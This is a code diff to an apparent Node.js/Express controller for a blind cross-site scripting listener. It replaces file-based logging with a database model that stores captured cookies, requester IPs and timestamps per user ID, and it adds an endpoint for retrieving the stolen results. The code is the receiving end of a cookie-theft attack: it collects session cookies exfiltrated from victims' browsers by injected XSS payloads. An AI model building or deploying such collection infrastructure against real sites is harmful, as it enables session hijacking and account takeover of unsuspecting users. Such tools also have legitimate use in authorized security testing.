@@ -1,35 +1,46 @@
-import fs from 'fs';
-import path from 'path';
-import { fileURLToPath } from 'url';
+import CapturedCookie from '../models/capturedCookieModel.js';
 
-const __filename = fileURLToPath(import.meta.url);
-const __dirname = path.dirname(__filename);
+export const bxssListener = async (req, res) => {
+  try {
+    const { cookie, userId } = req.query;
 
-const logsDir = path.join(__dirname, '../../logs');
+    if (!cookie || !userId) {
+      return res.status(400).json({ message: 'Missing cookie or userId' });
+    }
 
-// Ensure the logs directory exists
-if (!fs.existsSync(logsDir)) {
-  fs.mkdirSync(logsDir);
-}
+    const logEntry = {
+      userId,
+      cookie,
+      ip: req.ip,
+      timestamp: new Date().toISOString(),
+    };
 
-export const bxssListener = (req, res) => {
-  const { cookie } = req.query;
-  const logEntry = {
-    cookie,
-    ip: req.ip,
-    timestamp: new Date().toISOString(),
-  };
+    console.log('Captured Cookie:', logEntry);
 
-  console.log('Captured Cookie:', logEntry);
+    const newCapturedCookie = await CapturedCookie.create(logEntry);
 
-  // Optionally save the log to a file
-  const logFilePath = path.join(logsDir, 'bxss-logs.json');
-  let logs = [];
-  if (fs.existsSync(logFilePath)) {
-    logs = JSON.parse(fs.readFileSync(logFilePath, 'utf8'));
+    res.status(200).json({
+      status: 'success',
+      data: newCapturedCookie,
+    });
+  } catch (error) {
+    console.error('Error saving captured cookie:', error);
+    res.status(500).json({ message: 'Server error', error });
   }
-  logs.push(logEntry);
-  fs.writeFileSync(logFilePath, JSON.stringify(logs, null, 2));
+};
 
-  res.send('<h1>XSS Payload Executed</h1>');
+export const getXssResults = async (req, res) => {
+  try {
+    const { userId } = req.query;
+
+    if (!userId) {
+      return res.status(400).json({ message: 'Missing userId' });
+    }
+
+    const results = await CapturedCookie.find({ userId });
+    res.status(200).json(results);
+  } catch (error) {
+    console.error('Error fetching XSS results:', error);
+    res.status(500).json({ message: 'Server error', error });
+  }
 };
